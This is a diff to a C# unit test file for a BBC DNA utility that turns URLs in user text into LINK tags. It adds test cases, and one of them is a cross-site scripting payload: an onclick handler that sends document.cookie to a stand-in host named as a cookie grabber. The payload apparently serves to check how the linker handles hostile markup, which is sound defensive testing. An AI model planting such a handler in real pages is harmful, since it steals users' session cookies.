@@ -24,7 +24,9 @@ namespace BBC.Dna.Utils.Tests
                 "<a href=\"http://en.wikipedia.org/wiki/Sink_or_Swim_(song)\">tests</a>this is a test with a anchor tag at the end",
                 "<a href=\"http://www.bbc.co.uk/\">tests</a> this is a test with a slash at the end",
                 "this is a test http://en.wikipedia.org/wiki/Sink_or_Swim_(song) in the middle",
-                "link with category in it http://picasaweb.google.com/lh/photo/nJvUd_wNF75UjzHZWKxZTwC9?feat=directlink"
+                "link with category in it http://picasaweb.google.com/lh/photo/nJvUd_wNF75UjzHZWKxZTwC9?feat=directlink",
+                "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags."          ,                   
+                "At another point, using the 'Duffy' clip [ p00c9qf7 | 128kbps | aac | AK of http://www.bbc.co.uk/music/showcase#/collections/p0071598 ]"
                              };
             string[] expected = {"<LINK HREF=\"http://en.wikipedia.org/wiki/Sink_or_Swim_(song)\">http://en.wikipedia.org/wiki/Sink_or_Swim_(song)</LINK>",
                                     "this is a test with a . at the end <LINK HREF=\"http://en.wikipedia.org/wiki/Sink_or_Swim_(song)\">http://en.wikipedia.org/wiki/Sink_or_Swim_(song)</LINK>.",
@@ -35,6 +37,9 @@ namespace BBC.Dna.Utils.Tests
                                     "<a href=\"http://www.bbc.co.uk/\">tests</a> this is a test with a slash at the end",
                                     "this is a test <LINK HREF=\"http://en.wikipedia.org/wiki/Sink_or_Swim_(song)\">http://en.wikipedia.org/wiki/Sink_or_Swim_(song)</LINK> in the middle",
                                     "link with category in it <LINK HREF=\"http://picasaweb.google.com/lh/photo/nJvUd_wNF75UjzHZWKxZTwC9?feat=directlink\">http://picasaweb.google.com/lh/photo/nJvUd_wNF75UjzHZWKxZTwC9?feat=directlink</LINK>",
+                                    "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.",
+                                    "At another point, using the 'Duffy' clip [ p00c9qf7 | 128kbps | aac | AK of <LINK HREF=\"http://www.bbc.co.uk/music/showcase#/collections/p0071598\">http://www.bbc.co.uk/music/showcase#/collections/p0071598</LINK> ]"
+
                                 };
 
             for (int i = 0; i < input.Length; i++)
